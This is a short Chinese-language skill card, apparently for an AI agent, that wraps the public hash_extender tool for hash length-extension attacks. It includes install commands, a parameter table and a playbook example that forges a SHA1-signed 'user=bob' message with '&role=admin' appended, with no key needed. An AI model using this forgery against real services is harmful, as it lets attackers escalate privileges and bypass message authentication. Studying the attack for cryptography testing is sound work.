---
name: hash-extender-length-attack
description: hash_extender: 哈希长度扩展伪造。信号:密码学攻击,加密破解,长度扩展攻击,算法选择。
---

# hash_extender

- 攻击大类:C49 密码学攻击
- 上游仓库:https://github.com/iagox86/hash_extender
- 上游 License:BSD-3-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/iagox86/hash_extender && make
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./hash_extender -d 'data' -l 16 -s signature -a ';admin=1'` | 长度扩展攻击 |
| `-d data -s sig -a append -f sha1` | 算法选择 |
| `-o out.bin` | 输出 |

## 攻击场景 Playbook

### 哈希长度扩展伪造

```bash
./hash_extender -s 6d5f807e23db210bc254a28be2d6759a0f5f5d99 -d 'user=bob' -l 8 -a '&role=admin' -f sha1
# 不知密钥伪造带 admin 的合法签名
```

## 注意事项

iagox86 出品,MD5/SHA1/SHA256 长度扩展攻击,密钥长度可枚举。
